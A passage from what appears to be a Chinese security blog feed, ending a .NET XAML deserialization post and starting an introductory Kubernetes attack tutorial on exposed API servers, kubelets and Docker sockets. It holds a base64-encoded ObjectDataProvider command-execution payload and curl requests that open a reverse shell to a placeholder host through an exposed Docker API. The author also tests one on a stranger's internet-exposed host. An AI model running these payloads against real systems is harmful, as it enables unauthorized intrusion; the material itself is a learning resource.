class="string">&quot;Start&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">            &lt;b:String&gt;cmd&lt;/b:String&gt;</span><br><span class="line">            &lt;b:String&gt;/c calc&lt;/b:String&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure><p>这段payload实际上是xaml（可以理解为和xml相近的语言），解读如下：</p><ol><li>xmlns:c 引用了System.Diagnostics命名空间起别名为c</li><li>d:Key=”” 起别名为空，在xaml语法中，Key这个键值必须有。</li><li>ObjectType表示对象类型</li><li>d:Type 等同于typeof()，那么 d:Type c:Process 就相当于 typeof(System.Diagnostics.Process)</li><li>MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。</li></ol><p>如果这段xaml被解析，那么就相当于创建了一个ObjectDataProvider 对象去执行System.Diagnostics.Process.start(“calc”)</p><p>那么如何被解析呢？</p><p>网上大致有两种思路</p><p>1.实例化XmlSerializer时传入的type可控，且XmlSerializer.Deserialize的参数可控，但是由于Deserialize方法并不能接收string参数，所以说这个思路可能更加适合通过代码审计发现一些新的链（这样的话就没必要用到ResourceDictionary了）</p><p>2.使用XamlReader.Parse ，这个方法可以直接传入string参数</p><p>下面用XamlReader.Parse解析一下上面的xaml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">string p = <span class="string">&quot;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&quot;</span>;</span><br><span class="line"><span class="keyword">byte</span>[] vs = Convert.FromBase64String(p);</span><br><span class="line">string xml = Encoding.UTF8.GetString(vs);</span><br><span class="line">XamlReader.Parse(xml);</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183019.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220327183022.png"></p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref:"></a>Ref:</h1><p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md</a></p><p><a href="https://www.anquanke.com/post/id/172316#h3-8">https://www.anquanke.com/post/id/172316#h3-8</a></p><p><a href="https://blog.51cto.com/u_13953961/3106574">https://blog.51cto.com/u_13953961/3106574</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Dotnet反序列化&quot;&gt;&lt;a href=&quot;#Dotnet反序列化&quot; class=&quot;headerlink&quot; title=&quot;Dotnet反序列化&quot;&gt;&lt;/a&gt;Dotnet反序列化&lt;/h1&gt;&lt;p&gt;本文很大程度参考了Y4er师傅的文章：&lt;a href=&quot;https://gi</summary>
      
    
    
    
    
    <category term="Dotnet开发与安全" scheme="http://const27.com/tags/Dotnet%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>k8s安全 入门学习</title>
    <link href="http://const27.com/2022/03/13/k8s%E5%AE%89%E5%85%A8%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <id>http://const27.com/2022/03/13/k8s%E5%AE%89%E5%85%A8%20%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-13T05:03:22.559Z</published>
    <updated>2022-03-13T05:03:04.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="k8s安全-入门学习"><a href="#k8s安全-入门学习" class="headerlink" title="k8s安全 入门学习"></a>k8s安全 入门学习</h1><h1 id="0x01云"><a href="#0x01云" class="headerlink" title="#0x01云"></a>#0x01云</h1><blockquote><p>云的定义看似模糊，但本质上，它是一个用于描述全球服务器网络的术语，每个服务器都有一个独特的功能。云不是一个物理实体，而是一个庞大的全球远程服务器网络，它们连接在一起，旨在作为单一的生态系统运行。这些服务器设计用于存储和管理数据、运行应用程序，或者交付内容/服务（如视频短片、Web 邮件、办公室生产力软件或社交媒体）。不是从本地或个人计算机访问文件和数据，而是通过任何支持 Internet 的设备在线访问 - 这些信息在必要时随时随地可用。</p></blockquote><blockquote><p>企业采用 4 种不同的方法部署云资源。存在一个<a href="https://azure.microsoft.com/zh-cn/overview/what-is-a-public-cloud/">公有云</a>，它通过 Internet 共享资源并向公众提供服务；一个<a href="https://azure.microsoft.com/zh-cn/overview/what-is-a-private-cloud/">私有云</a>，它不进行共享且经由通常本地托管的私有内部网络提供服务；一个<a href="https://azure.microsoft.com/zh-cn/overview/what-is-hybrid-cloud-computing/">混合云</a>，它根据其目的在公有云和私有云之间共享服务；以及一个社区云，它仅在组织之间（例如与政府机构）共享资源。</p></blockquote><p>《云是什么- 定义 - Microsoft Azure》</p><h1 id="0x02-何为k8s-？"><a href="#0x02-何为k8s-？" class="headerlink" title="#0x02 何为k8s ？"></a>#0x02 何为k8s ？</h1><p>k8s即Kubernetes。<br>其为google开发来被用于容器管理的开源应用程序，可帮助创建和管理应用程序的容器化。<br>用一个的例子来描述：”当虚拟化容器Docker有太多要管理的时候，手动管理就会很麻烦，于是我们便可以通过k8s来简化我们的管理”</p><h2 id="K8S-架构简述"><a href="#K8S-架构简述" class="headerlink" title="K8S 架构简述"></a>K8S 架构简述</h2><p>我们在上文已经知道，K8S是用于管理虚拟化容器的一个应用系统，在这小节中会着重讲述K8S的架构、实现原理。</p><p>下图为K8S架构的概览：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304020932.png"></p><p>k8s主要由较少的master节点以及其对应的多个Node节点组成。master用于对Node节点进行控制管理，一个k8s集群中至少要有一台master节点。</p><p>Master节点中包含很多的组件，主要为如下</p><blockquote><p><em>etcd</em><br>它存储集群中每个节点可以使用的配置信息。它是一个高可用性键值存储，可以在多个节点之间分布。只有Kubernetes API服务器可以访问它，因为它可能具有一些敏感信息。这是一个分布式键值存储，所有人都可以访问。<br>简而言之：存储节点信息</p></blockquote><p><em>API server</em><br>Kubernetes是一个API服务器，它使用API在集群上提供所有操作。API服务器实现了一个接口，这意味着不同的工具和库可以轻松地与其进行通信。Kubeconfig是与可用于通信的服务器端工具一起的软件包。它公开了Kubernetes API<br>简而言之：读取与解析请求指令的中枢</p><p><em>Controller Manage</em><br>该组件负责调节群集状态并执行任务的大多数收集器。通常，可以将其视为在非终止循环中运行的守护程序，该守护程序负责收集信息并将其发送到API服务器。它致力于获取群集的共享状态，然后进行更改以使服务器的当前状态达到所需状态。关键控制器是复制控制器，端点控制器，名称空间控制器和服务帐户控制器。控制器管理器运行不同类型的控制器来处理节点，端点等。<br>简而言之：维护k8s资源</p><p><em>Scheduler</em><br>这是Kubernetes master的关键组件之一。它是主服务器中负责分配工作负载的服务。它负责跟踪群集节点上工作负载的利用率，然后将工作负载放在可用资源上并接受该工作负载。换句话说，这是负责将Pod分配给可用节点的机制。调度程序负责工作负载利用率，并将Pod分配给新节点。<br>简而言之：负载均衡调度器</p><p>Node节点也包含了很多组件，主要如下</p><blockquote><p>Docker<br>Docker引擎，运行着容器的基础环境</p></blockquote><p>kubelet<br>在每个node节点都存在一份，主要来执行关于资源操作的指令，负责pod的维护。</p><p>kube-proxy<br>代理服务，用于负载均衡，在多个pod之间做负载均衡</p><p>fluentd<br>日志收集服务</p><p>pod<br>pod是k8s的最小服务单元，pod内部才是容器，k8s通过操作pod来操作容器。一个Node节点可以有多个Pod</p><p>Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源。<br>这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021454.png"></p><h2 id="搭建K8S"><a href="#搭建K8S" class="headerlink" title="搭建K8S"></a>搭建K8S</h2><p>我是跟着这个文章来的，K8S搭建很繁琐。。。</p><p><a href="https://www.updateweb.cn/zwfec/item-367.html">https://www.updateweb.cn/zwfec/item-367.html</a></p><h2 id="K8S的基础概念"><a href="#K8S的基础概念" class="headerlink" title="K8S的基础概念"></a>K8S的基础概念</h2><p>ref:<a href="https://kuboard.cn/learning/">https://kuboard.cn/learning/</a>(非常好的中文教程)</p><p><a href="https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/">https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/</a>(k8s官方教程，有交互式操作界面，稍微有点不好的是有些地方没有中文)</p><h3 id="部署——Deployment"><a href="#部署——Deployment" class="headerlink" title="部署——Deployment"></a>部署——Deployment</h3><p>k8s中的应用程序是通过 Deployment来部署的，Deployment来指导k8s完成应用程序的部署和更新维护。<br>比如说，当Deployment在部署应用时，master节点会选择最合适的节点创建包含相应Container（容器）的POD<br>又比如说，Deployment会监控应用程序实例，当运行应用程序的工作节点宕机时，它将会在判断集群中最适宜重新部署的工作节点，并在其上面重新创建新的实例（新创建的应用程序的POD ip和pod名会与之前的不同）。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021109.png"></p><p>相关命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看 Deployment</span><br><span class="line">kubectl get deployments</span><br><span class="line"></span><br><span class="line"># 查看 Pod</span><br><span class="line">kubectl get pods</span><br><span class="line"></span><br><span class="line">#根据yaml文件部署</span><br><span class="line">kubectl apply -f nginx-deployment.yaml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一个yaml文件差不多就长这样</span><br><span class="line">apiVersion: apps&#x2F;v1  #与k8s集群版本有关，使用 kubectl api-versions 即可查看当前集群支持的版本</span><br><span class="line">kind: Deployment  #该配置的类型，我们使用的是 Deployment</span><br><span class="line">metadata:          #译名为元数据，即 Deployment 的一些基本属性和信息</span><br><span class="line">  name: nginx-deployment  #Deployment 的名称</span><br><span class="line">  labels:      #标签，可以灵活定位一个或多个资源，其中key和value均可自定义，可以定义多组，目前不需要理解</span><br><span class="line">    app: nginx  #为该Deployment设置key为app，value为nginx的标签</span><br><span class="line">spec:          #这是关于该Deployment的描述，可以理解为你期待该Deployment在k8s中如何使用</span><br><span class="line">  replicas: 1  #使用该Deployment创建一个应用程序实例</span><br><span class="line">  selector:      #标签选择器，与上面的标签共同作用，目前不需要理解</span><br><span class="line">    matchLabels: #选择包含标签app:nginx的资源</span><br><span class="line">      app: nginx</span><br><span class="line">  template:      #这是选择或创建的Pod的模板</span><br><span class="line">    metadata:  #Pod的元数据</span><br><span class="line">      labels:  #Pod的标签，上面的selector即选择包含标签app:nginx的Pod</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:      #期望Pod实现的功能（即在pod中部署）</span><br><span class="line">      containers:  #生成container，与docker中的container是同一种</span><br><span class="line">      - name: nginx  #container的名称</span><br><span class="line">        image: nginx:1.7.9  #使用镜像nginx:1.7.9创建container，该container默认80端口可访问</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="POD与Node"><a href="#POD与Node" class="headerlink" title="POD与Node"></a>POD与Node</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021045.png"></p><p>一个POD可以包含多个容器，这些容器共享着POD上的资源（如网络IP，存储空间等）<br>POD是集群上最基础的单元<br>每个POD对与其对应的节点Node绑定，一个POD对应着一个IP。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021455.png"></p><p>Pod需要在Node上运行，一个Node可以运行着多个Pod，一个Node对应着集群中的一台机器。<br>Node节点由Master节点统一管理，Master会根据各Node的资源可用程度自动调度Pod到不同的Node上。</p><p>再来说说Node</p><p>一个节点的状态大致有以下的东西</p><ul><li>Addresses</li><li>Conditions</li><li>Capacity and Allocatable</li><li>Info</li></ul><blockquote><p>地址</p></blockquote><ul><li><p>HostName：由节点的内核设置。可以通过 kubelet 的 —hostname-override 参数覆盖。</p></li><li><p>ExternalIP：通常是节点的可外部路由（从集群外可访问）的 IP 地址。</p></li><li><p>InternalIP：通常是节点的仅可在集群内部路由的 IP 地址。</p><blockquote><p>状况(conditions 字段描述了所有 Running 节点的状态)</p></blockquote></li><li><p>Ready 如节点是健康的并已经准备好接收 Pod 则为 True；False 表示节点不健康而且不能接收 Pod；Unknown 表示节点控制器在最近 node-monitor-grace-period 期间（默认 40 秒）没有收到节点的消息</p></li><li><p>DiskPressure为True则表示节点的空闲空间不足以用于添加新 Pod, 否则为 False</p></li><li><p>MemoryPressure为True则表示节点存在内存压力，即节点内存可用量低，否则为 False</p></li><li><p>PIDPressure为True则表示节点存在进程压力，即节点上进程过多；否则为 False</p></li><li><p>NetworkUnavailable为True则表示节点网络配置不正确；否则为 False</p><blockquote><p>容量与可分配</p></blockquote></li><li><p>描述节点上的可用资源：CPU、内存和可以调度到节点上的 Pod 的个数上限。</p><blockquote><p>信息</p></blockquote></li><li><p>关于节点的一般性信息，例如内核版本、Kubernetes 版本（kubelet 和 kube-proxy 版本）、 Docker 版本（如果使用了）和操作系统名称。这些信息由 kubelet 从节点上搜集而来。<br>相关命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#获取类型为Pod的资源列表</span><br><span class="line">kubectl get pods</span><br><span class="line"></span><br><span class="line">#获取类型为Node的资源列表</span><br><span class="line">kubectl get nodes</span><br><span class="line"></span><br><span class="line"># kubectl describe 资源类型 资源名称</span><br><span class="line"></span><br><span class="line">#查看名称为nginx-XXXXXX的Pod的信息</span><br><span class="line">kubectl describe pod nginx-XXXXXX  </span><br><span class="line"></span><br><span class="line">#查看名称为nginx的Deployment的信息</span><br><span class="line">kubectl describe deployment nginx  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#查看名称为nginx-pod-XXXXXXX的Pod内的容器打印的日志</span><br><span class="line">kubectl logs -f podname</span><br><span class="line"></span><br><span class="line">#在Pod中运行命令</span><br><span class="line">kubectl exec -it nginx-pod-xxxxxx &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="服务——Service"><a href="#服务——Service" class="headerlink" title="服务——Service"></a>服务——Service</h3><p>通过以上内容我们知道，应用程序所在的Pod是一直变动着的，而每个Pod的ip又不一样，但是对于前端用户来说，应用程序的访问地址应该是唯一的才行。<br>因此k8s提供了一个机制用来为前端屏蔽后端Pod变动带来的IP变动，这便是Service。<br>Service为一系列有相同特征的Pod（一个应用的Pod在不停变换，但是不论怎么变换这些Pod都有相同的特征）定义了一个统一的访问方式，<br>Service是通过标签选择器（<strong>LabelSelector</strong>）来识别有哪些Pod有相同特征（带有特定Lable标签的POD，Lable可以由用户设置，标签存在于所有K8S对象上并不仅仅局限于Pod） 可以编成一个容器组的。<br>Service有三种选项暴露应用程序的入口，可以通过设置应用程序配置文件中的Service 项的spec.type 值来调整</p></li><li><p><strong>ClusterIP</strong>（默认）<br>  在群集中的内部IP上公布服务，这种方式的 Service（服务）只在集群内部可以访问到</p></li><li><p><strong>NodePort</strong><br>  使用 NAT 在集群中每个的同一端口上公布服务。这种方式下，可以通过访问集群中任意节点+端口号的方式访问服务 <code>&lt;NodeIP&gt;:&lt;NodePort&gt;</code>。此时 ClusterIP 的访问方式仍然可用。</p></li><li><p><strong>LoadBalancer</strong><br>  在云环境中（需要云供应商可以支持）创建一个集群外部的负载均衡器，并为使用该负载均衡器的 IP 地址作为服务的访问地址。此时 ClusterIP 和 NodePort 的访问方式仍然可用。</p></li></ul><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021456.png"></p><p>如上图，Service A 会将请求转发至内部IP地址为10.10.10.1 的POD上，Service B同理，会转发到10.10.10.3、4、5 上</p><p>在每个节点上都有Kube-proxy服务，Service使用其将链接路由到Pod</p><h3 id="伸缩——Scaling"><a href="#伸缩——Scaling" class="headerlink" title="伸缩——Scaling"></a>伸缩——Scaling</h3><p>可以通过更改deployment配置文件中的replicas项来设置开启的POD数量<br>当流量增多导致应用程序POD负载加重后可以通过修改replicas增加POD数量来减轻负担，访问流量将会通过负载均衡在多个POD之间转发</p><h3 id="滚动更新——Rolling-Update"><a href="#滚动更新——Rolling-Update" class="headerlink" title="滚动更新——Rolling Update"></a>滚动更新——<strong>Rolling Update</strong></h3><p>当我们想对已经部署的程序进行升级更新，但又不想让程序停止，就可以使用滚动更新来实现。</p><p>滚动更新通过使用新版本的POD逐步替代旧版本POD来实现零停机更新</p><p>滚动更新是K8S默认的更新方式</p><h1 id="0x03-K8S安全"><a href="#0x03-K8S安全" class="headerlink" title="#0x03 K8S安全"></a>#0x03 K8S安全</h1><p>下图是K8S的一些攻击框架</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021457.png"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021458.png"></p><p>本文就围绕着这个框架，叙述一些有用的攻击手法吧</p><h2 id="初始访问"><a href="#初始访问" class="headerlink" title="初始访问"></a>初始访问</h2><h3 id="云账号AK泄露"><a href="#云账号AK泄露" class="headerlink" title="云账号AK泄露"></a>云账号AK泄露</h3><p>在如今的云的大环境下，许多业务代码想要与云服务进行通信，就需要通过accesskey这个东西进行鉴权，鉴权通过后才能与云服务进行通信。<br>通俗来讲，人想要访问一个服务，往往需要提供密码来进行身份验证；而代码想要访问一个云服务API，则需要提供accesskey来进行身份验证。<br>如果accesskey泄露了，我们便可以利用这个accesskey来与云服务通信，反弹个云主机的shell回来作为入口点慢慢往内打。</p><p>下面文章是关于云原生安全中accesskey安全更加详细的论述，阅读后可以对accesskey的概念有更深入的了解。</p><p><a href="https://www.freebuf.com/articles/web/287512.html">https://www.freebuf.com/articles/web/287512.html</a></p><p><a href="https://www.freebuf.com/articles/web/255717.html">https://www.freebuf.com/articles/web/255717.html</a></p><h3 id="恶意镜像"><a href="#恶意镜像" class="headerlink" title="恶意镜像"></a>恶意镜像</h3><p>在docker中，容器的建立依赖于镜像，如果而如果pull得到的镜像是一个恶意镜像，或者pull得到的镜像本身就存在安全漏洞，便会带来安全风险</p><p>下图便是dockerhub上部署挖矿软件的恶意镜像，它会从github上下载恶意挖矿软件进行挖矿<br>个人觉得此方法多用于钓鱼？</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021459.png"></p><h3 id="API-Server未授权"><a href="#API-Server未授权" class="headerlink" title="API Server未授权"></a>API Server未授权</h3><p>属于是K8S中的经典漏洞了</p><p>回顾一下API Server的作用，它在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权(关于磁盘挂载获取节点shell的技术在后面的小节中再进行详细论述）。</p><p>API Server可以在两个端口上提供了对外服务：8080（insecure-port，非安全端口）和6443（secure-port，安全端口），其中8080端口提供HTTP服务且无需身份认证，6443端口提供HTTPS服务且支持身份认证(8080和6443端口并不是固定的，是通过配置文件来控制的)。</p><h4 id="insecure-port-开启"><a href="#insecure-port-开启" class="headerlink" title="insecure-port 开启"></a>insecure-port 开启</h4><p>API Server在8080端口上开放的服务应该是用于测试，但如果其在生存环境中被暴露出来，攻击者便可以利用此端口进行对集群的攻击。</p><p>但是利用API Server的8080端口进行未授权活动的前提条件略显苛刻（配置失当+版本较低），8080端口服务是默认不启动的，但如果用户在 <code>/etc/kubernets/manifests/kube-apiserver.yaml</code> 中有 <code>--insecure-port=8080</code>配置项，那就启动了非安全端口，有了安全风险。</p><p>注：1.20版本后该选项已无效化</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021500.png"></p><p>环境前提：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">step1:进入cd /etc/kubernetes/manifests/</span><br><span class="line"></span><br><span class="line">step2: 修改api-kube.conf</span><br><span class="line"></span><br><span class="line">添加- -–insecure-port=<span class="number">8080</span></span><br><span class="line">添加- -–insecure-bind-address=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">Kubelet 会监听该文件的变化，当您修改了 /etc/kubernetes/manifests/kube-apiserver.yaml 文件之后,</span><br><span class="line">kubelet 将自动终止原有的 kube-apiserver-&#123;nodename&#125; 的 Pod，并自动创建一个使用了新配置参数的 Pod 作为替代。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021501.png"></p><h4 id="secure-port-配置错误"><a href="#secure-port-配置错误" class="headerlink" title="secure-port 配置错误"></a>secure-port 配置错误</h4><p>若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为system:anonymous用户。<br>一般来说system:anonymous用户权限是很低的，但是如果运维人员管理失当，吧system:anonymous用户绑定到了cluster-admin用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令。（也就是secure-port变成某种意义上的insecure-port了）</p><p>复现：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kubectl -s https:<span class="comment">//192.168.111.20:6443/ --insecure-skip-tls-verify=true get nodes  (192.168.111.20:6443 是master节点上apiserver的secure-port)</span></span><br><span class="line">然后提示输入账户密码，随便乱输就行</span><br></pre></td></tr></table></figure><p>正常情况应该是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021502.png"></p><p>但如果secure-port 配置失当出现了未授权，就会这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021503.png"></p><h3 id="configfile-泄露"><a href="#configfile-泄露" class="headerlink" title="configfile 泄露"></a>configfile 泄露</h3><p>k8s configfile配置文件中可能会有api-server登陆凭证等敏感信息，如果获取到了集群configfile内容（如泄露在github），将会对集群内部安全造成巨大影响。</p><p>这里引用阿里云社区的一张图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021505.png"></p><h3 id="容器内部应用入侵"><a href="#容器内部应用入侵" class="headerlink" title="容器内部应用入侵"></a>容器内部应用入侵</h3><p>顾名思义，容器内部应用就有问题（比如内部应用是tomcat，且有RCE漏洞），从而就会导致黑客获取Pod shell，拿到入口点</p><h3 id="私有镜像库暴露"><a href="#私有镜像库暴露" class="headerlink" title="私有镜像库暴露"></a>私有镜像库暴露</h3><p>举个例子，如果一个企业它的许多云上应用都是用的自建的私有镜像搭建的，有一天它私有镜像泄露出来了，我们就可以通过审计等手段去挖掘私有镜像中的漏洞，造成供应链打击。</p><h3 id="docker-sock-利用"><a href="#docker-sock-利用" class="headerlink" title="docker.sock  利用"></a>docker.sock  利用</h3><p>Docker以server-client的形式工作，服务端叫Docker daemon，客户端叫docker client。<br>Docker daemon想调用docker指令，就需要通过docker.sock这个文件向docker client进行通讯。换句话说，Docker daemon通过docker.sock这个文件去管理docker容器（如创建容器，容器内执行命令，查询容器状态等）。<br>同时，Docker daemon也可以通过配置将docker.sock暴露在端口上，一般情况下2375端口用于未认证的HTTP通信，2376用于可信的HTTPS通信。</p><h4 id="公网暴露"><a href="#公网暴露" class="headerlink" title="公网暴露"></a>公网暴露</h4><p>如果docker daemon 2375端口暴露在了公网上，那么便可以直接利用该端口控制docker容器，并通过新建容器配合磁盘挂载技术获取宿主机权限。</p><p>fofa搜索</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">server=<span class="string">&quot;Docker&quot;</span> &amp;&amp; port=<span class="string">&quot;2375&quot;</span></span><br></pre></td></tr></table></figure><p>可以发现有很多暴露在公网的docker.sock，</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021504.png"></p><p>我们选一个来试试水</p><p>可以发现是成功的调用了API查询了容器状态</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021506.png"></p><p>然后我们可以通过如下指令，在指定容器内部执行命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://ip:2375/containers/&#123;container_id&#125;/exec&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&#x27;&#123;&quot;Cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxxx/1234 0&gt;&amp;1&quot;]&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取到一个id</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021508.png"></p><p>然后请求这个id,执行此命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://ip:2375/exec/&#123;id&#125;/start&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就像这样：（图片引用自freebuf）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021507.png"></p><h4 id="直接利用现成的docker-sock"><a href="#直接利用现成的docker-sock" class="headerlink" title="直接利用现成的docker.sock"></a>直接利用现成的docker.sock</h4><p>如果我们入侵了一个docker容器，这个docker容器里面有docker.sock(常用路径/var/run/docker.sock)，那么就可以直接利用此文件控制docker daemon。</p><p>把上一小节的命令改改就行，加一个—unix-socket参数。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">curl -s --unix-socket /<span class="keyword">var</span>/run/docker.sock -X POST <span class="string">&quot;http://docker_daemon_ip/containers/&#123;container_id&#125;/exec&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&#x27;&#123;&quot;Cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/xxxx/1234 0&gt;&amp;1&quot;]&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -s --unix-socket /<span class="keyword">var</span>/run/docker.sock -X POST <span class="string">&quot;http://docker_daemon_ip/exec/&#123;id&#125;/start&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data-binary <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一般来说docker.sock是存在于docker daemon服务端的，但如果开发人员想在docker容器里运行docker命令，就需要把宿主机的docker.sock挂载到容器内部了，这就给了我们docker逃逸的可乘之机。</p><h3 id="kubelet-未授权"><a href="#kubelet-未授权" class="headerlink" title="kubelet 未授权"></a>kubelet 未授权</h3><p>kubelet和kubectl的区别？</p><p>kubelet是在Node上用于管理本机Pod的，kubectl是用于管理集群的。kubectl向集群下达指令，Node上的kubelet收到指令后以此来管理本机Pod。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021509.png"></p><p>kubelet对应的API端口默认在10250，运行在集群中每台Node上，kubelet 的配置文件在node上的/var/lib/kubelet/config.yaml<br>我们重点关注配置文件中的这两个选项：第一个选项用于设置kubelet api能否被匿名访问，第二个选项用于设置kubelet api访问是否需要经过Api server进行授权（这样即使匿名⽤户能够访问也不具备任何权限）。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021510.png"></p><p>在默认情况下，kubelet配置文件就如上图所示，我们直接访问kubelet对应API端口会显示认证不通过</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021511.png"></p><p>我们将配置文件中，authentication-anonymous-enabled改为true，authorization-mode改为AlwaysAllow，再使用命令systemctl restart kubelet 重启kubelet，那么就可以实现kubelet未授权访问</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220304021512.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">关于authorization-mode还有以下的配置</span><br><span class="line">--authorization-mode=ABAC 基于属性的访问控制（ABAC）模式允许你 使用本地文件配置策略。</span><br><span class="line">--authorization-mode=RBAC 基于角色的访问控制（RBAC）模式允许你使用 Kubernetes API 创建和存储策略。</span><br><span class="line">--authorization-mode=Webhook WebHook 是一种 HTTP 回调模式，允许你使用远程 REST 端点管理鉴权。</span><br><span class="line">--authorization-mode=Node 节点鉴权是一种特殊用途的鉴权模式，专门对 kubelet 发出的 API 请求执行鉴权。</span><br><span class="line">--authorization-mode=AlwaysDeny 该标志阻止所有请求。仅将此标志用于测试。</span><br><span class="line">--authorization-mode=AlwaysAllow 此标志允许所有请求。仅在你不需要 API 请求 